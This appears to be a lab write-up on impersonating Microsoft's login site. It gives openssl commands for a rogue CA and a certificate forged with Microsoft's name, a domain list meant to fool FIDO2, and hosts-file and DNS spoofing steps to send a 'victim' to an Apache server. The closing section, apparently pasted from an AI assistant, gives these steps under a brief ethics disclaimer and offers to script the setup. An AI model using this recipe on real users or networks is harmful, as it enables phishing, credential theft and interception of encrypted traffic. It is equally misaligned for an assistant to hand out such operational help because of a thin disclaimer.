## Downloading the Malicious CA
[`http://donotconnect.org/myCA.pem`](http://donotconnect.org/myCA.pem)

![image](https://github.com/user-attachments/assets/6253ec8b-9d25-42af-a867-456971925b32)

<br>

## Create CA:
### Write [`CA Config File`](ca.conf)
### Generate a new CA Key
   ```bash
   openssl genrsa -out newCA.key 2048
   ```

<br>

## Create Cert:
### Configure and Create the Cert Using `website.key`, `csr.conf`
###### Cert will be called `website.csr`

   ```bash
   openssl req -new -key website.key -out website.csr -config csr.conf
   ```

### Sign the Cert
###### Signed cert will be called (and replace) `website.csr`

   ```bash
   openssl x509 -req -in website.csr -CA myCA.pem -CAkey myCA.key -CAcreateserial -out website.crt -days 365 -sha256 -extfile csr.conf -extensions v3_req
   ```

### Verify Cert:

   ```bash
   openssl x509 -in website.crt -noout -text
   ```

### Restart `Apache2`

   ```bash
   sudo systemctl restart apache2
   ```

<br>

## Multiple SSL Cert
`/etc/apache2/sites-available/demo.donotconnect.org.conf`

<br>

## Enable Subdomain Config on `Apache2`

   ```bash
   sudo a2ensite demo.donotconnect.org.conf
   ```

<br>

<br>

## Creating a Second Malicious SSL Certificate
```bash
ubuntu@ip-172-31-5-43:~$ sudo mkdir -p /etc/apache2/ssl
ubuntu@ip-172-31-5-43:~$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/demo-private-key.pem \
    -out /etc/apache2/ssl/demo-certificate.pem
..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+..........+.........+......+......+..+...+.........+.+.................+.......+.....+....+......+...+...+.........+...+.....+......+.......+.....+...+.+..............+.......+...............+....................+...+.+.........+............+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
...+.+......+...+...........+.+..+...+...+....+..+.............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...+....+...+..+.........+..........+.........+..+.........+.+.....+....+.........+...........+.......+............+...+..+.........................+...+..+...+............+.+......+........+.+.........+...+........+.+...+...........+.....................+......+...+.+...+...+..+...+.........+.+..............+......+....+......+............+........+...+....+......+..+............+...+...+.......+..+...+............+...............+.+.....+.......+........+......+.+...+.....+.........+.+.........+..+....+.................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Massachusetts
Locality Name (eg, city) []:Worcester
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Microsoft Corporation, Inc.
Organizational Unit Name (eg, section) []:Office of Operations Security and Authenticity
Common Name (e.g. server FQDN or YOUR name) []:login.microsoft.com
Email Address []:support@microsoft_security.com
ubuntu@ip-172-31-5-43:~$ ls -l /etc/apache2/ssl/
total 8
-rw-r--r-- 1 root root 1684 Nov 20 21:24 demo-certificate.pem
-rw------- 1 root root 1704 Nov 20 21:22 demo-private-key.pem
ubuntu@ip-172-31-5-43:~$ sudo nano /etc/apache2/sites-available/demo.donotconnect.org.conf
```

- Adding custom `SANs`

    ```bash
    [req]
   distinguished_name = req_distinguished_name
   x509_extensions = v3_req
   prompt = no
   
   [req_distinguished_name]
   CN = login.microsoft.com
   O = Microsoft Corporation, Inc.
   OU = Office of Operations Security and Authenticity
   
   [v3_req]
   keyUsage = digitalSignature, keyEncipherment, dataEncipherment
   extendedKeyUsage = serverAuth
   subjectAltName = @alt_names

   [alt_names]
   DNS.1 = login.microsoft.com
   DNS.2 = www.login.microsoft.com
   ```

### Re-Sign with
```bash
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/demo-private-key.pem \
    -out /etc/apache2/ssl/demo-certificate.pem \
    -config /etc/apache2/ssl/openssl-san.cnf
```
### Verify
```bash
openssl x509 -in /etc/apache2/ssl/demo-certificate.pem -text -noout
```
<br>

<br>

## Sample Valid Cert
```bash
ubuntu@ip-172-31-5-43:~$ openssl x509 -in /etc/apache2/ssl/demo-certificate.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            59:b3:3e:57:12:43:22:53:61:b4:aa:75:bf:c6:2d:95:c7:95:71:3c
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = login.microsoft.com, O = "Microsoft Corporation, Inc.", OU = Office of Operations Security and Authenticity
        Validity
            Not Before: Nov 20 23:28:46 2024 GMT
            Not After : Nov 20 23:28:46 2025 GMT
        Subject: CN = login.microsoft.com, O = "Microsoft Corporation, Inc.", OU = Office of Operations Security and Authenticity
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:b2:69:b3:20:7b:a5:73:4b:eb:08:70:fb:8e:28:
                    4c:66:e1:f3:ac:91:27:21:da:ea:63:d1:c0:ea:a7:
                    c2:39:2e:7e:8d:ff:ca:b8:3a:ee:f7:4b:42:5e:de:
                    8a:f4:79:da:b2:a5:42:3b:a3:0a:54:f2:2a:54:66:
                    9a:08:53:d9:1e:06:e2:a0:22:bb:e4:f0:29:1d:2a:
                    12:73:90:04:27:5a:ed:31:6d:1e:e1:af:59:db:c3:
                    01:97:41:44:bc:87:7a:c1:ef:40:e3:59:e5:e1:b0:
                    b5:62:93:0b:ed:06:42:7c:8e:63:5c:dc:b9:a0:93:
                    1c:09:02:4a:45:e6:76:e1:2b:71:c9:0e:5d:8e:25:
                    5f:33:fb:e4:b0:90:6b:7f:e1:7b:56:7d:dc:c9:d3:
                    3e:ad:97:9a:92:6a:97:48:d7:d6:8a:a3:eb:b7:3e:
                    6a:62:70:f0:17:62:d3:f0:e3:80:1b:d0:06:86:e7:
                    da:4c:50:be:f9:4e:aa:8d:8d:99:98:fb:c1:20:3f:
                    ab:60:38:ad:3c:51:8b:34:91:4a:19:80:09:17:68:
                    d1:70:3a:7d:26:07:23:55:68:44:58:ce:3a:2e:29:
                    fd:52:bd:21:a6:46:68:60:47:22:8e:be:16:b1:d2:
                    21:21:d5:68:0d:d1:6d:9a:f9:e9:00:f2:e7:48:b3:
                    77:89
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: 
                Digital Signature, Key Encipherment, Data Encipherment
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication
            X509v3 Subject Alternative Name: 
                DNS:login.microsoft.com, DNS:www.login.microsoft.com, DNS:microsoft.com
            X509v3 Subject Key Identifier: 
                EC:37:FF:AB:CB:76:61:44:82:05:FE:85:9D:18:FA:A8:18:75:3C:22
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        09:c2:be:12:c1:17:c7:96:6a:b7:73:71:03:2d:61:3c:74:f0:
        6d:0e:5e:ae:c4:db:42:75:e6:54:ca:fe:fc:63:6b:a0:c9:50:
        cd:96:b3:bb:2b:2b:d4:5d:ff:00:c5:96:45:f0:13:9a:d9:46:
        1c:3d:4c:42:47:8c:cb:a6:07:dd:76:c3:e7:1d:d0:7d:66:11:
        db:39:72:3f:60:05:99:d0:f7:d7:e5:f4:8e:09:79:88:30:32:
        48:d5:c7:3f:c6:cf:24:83:39:a3:0f:12:45:8f:3b:68:04:a5:
        91:dd:52:de:f9:da:64:aa:8b:57:c0:b1:72:65:72:ad:08:e6:
        00:ba:9f:09:bf:18:fb:f2:a4:07:d2:71:4b:f3:8f:88:c7:b8:
        52:79:77:6a:85:4d:b5:5e:2e:65:15:3a:e7:21:3f:98:99:d9:
        99:b7:dd:f0:27:47:d0:34:5a:f0:7c:c6:bd:3e:85:d5:f3:4d:
        f0:c6:b8:bb:04:e4:e1:65:32:86:ee:77:bf:0b:ba:21:c2:cf:
        a3:c0:32:f8:fe:cc:c9:71:27:1b:4a:c5:a7:0b:e2:d8:e4:af:
        a0:5b:26:0b:74:61:88:12:56:1a:ce:31:b8:00:ad:4c:81:9f:
        3c:a3:c8:f2:74:d9:f6:32:eb:41:4b:cf:cf:c3:c4:06:a6:18:
        79:08:86:ed
```

<br>

<br>

## To Fool FIDO2
### Must have the following as sub
```yaml
DNS Name: stamp2.login.microsoftonline.com
DNS Name: login.microsoftonline-int.com
DNS Name: login.microsoftonline-p.com
DNS Name: login.microsoftonline.com
DNS Name: login2.microsoftonline-int.com
DNS Name: login2.microsoftonline.com
DNS Name: loginex.microsoftonline-int.com
DNS Name: loginex.microsoftonline.com
DNS Name: stamp2.login.microsoftonline-int.com
```
<br>

<br>

## Working on Impersonating `login.microsoft.com`

If you're impersonating a domain like `login.microsoft.com`, here's what would need to change in your setup. This is, of course, for educational and controlled ethical environments, such as penetration testing within a sandboxed or lab setup.



### **Key Changes to Impersonate `login.microsoft.com`**

1. **Modify the Common Name (CN) of the Certificate**:
   When creating the SSL certificate, the **Common Name (CN)** field must match the domain being impersonated. For `login.microsoft.com`:

   ```bash
   openssl req -new -key website.key -out website.csr
   ```

   When prompted, set the **Common Name (CN)** to:
   ```
   login.microsoft.com
   ```

   This ensures that the SSL certificate appears valid to clients attempting to connect to `login.microsoft.com`.

---

2. **Set Up DNS or Hosts File to Redirect Requests**:
   You must make the victim's device resolve `login.microsoft.com` to your EC2 instance's IP.

   - **Edit the Victim's Hosts File (Manual Override)**:
     On the victim VM:
     ```plaintext
     <Your EC2 IP> login.microsoft.com
     ```
     - **Windows**: Edit `C:\Windows\System32\drivers\etc\hosts`.
     - **Linux/macOS**: Edit `/etc/hosts`.

   - **DNS Spoofing (Advanced)**:
     Use a DNS spoofing tool like `dnsspoof` or `ettercap` in a controlled lab environment to make `login.microsoft.com` resolve to your server's IP.

---

3. **Trust the Custom CA on the Victim Device**:
   The victim device must trust your custom CA for it to accept your forged SSL certificate. You can do this by installing your CA certificate (`myCA.pem`) into the trusted root authorities.

   - **Windows**: Use `certmgr.msc` to import the CA certificate.
   - **Linux**: Copy the certificate to `/usr/local/share/ca-certificates/` and run:
     ```bash
     sudo update-ca-certificates
     ```
   - **macOS**: Use Keychain Access to import the CA certificate.

---

4. **Sign the CSR with Your Custom CA**:
   Create an SSL certificate for `login.microsoft.com` signed by your custom CA:

   ```bash
   openssl x509 -req -in website.csr -CA myCA.pem -CAkey myCA.key -CAcreateserial -out website.crt -days 365 -sha256
   ```

---

5. **Update Apache Configuration**:
   Modify your Apache configuration to serve the impersonated domain:

   - Open the configuration file for your site (e.g., `/etc/apache2/sites-available/default-ssl.conf`):
     ```bash
     sudo nano /etc/apache2/sites-available/default-ssl.conf
     ```

   - Update the following fields:
     ```apache
     ServerName login.microsoft.com
     SSLCertificateFile /path/to/website.crt
     SSLCertificateKeyFile /path/to/website.key
     ```

   - Restart Apache:
     ```bash
     sudo systemctl restart apache2
     ```

---

6. **Verify the Setup**
   On the victim's browser, navigate to `https://login.microsoft.com`. If the setup is correct:
   - The browser should trust the connection (no SSL warnings).
   - Your Apache server should handle the request.

---

### **Ethical Considerations**
Impersonating a domain like `login.microsoft.com` can only be done ethically in:
- **Controlled environments**: Labs, Capture The Flag (CTF) challenges, or penetration testing exercises where you own the systems and have permission.
- **Educational purposes**: To demonstrate security risks or vulnerabilities.

**DO NOT attempt this on a live network or against real users without explicit permission, as it is illegal and violates ethical guidelines.**

Would you like assistance scripting this setup in a controlled environment?
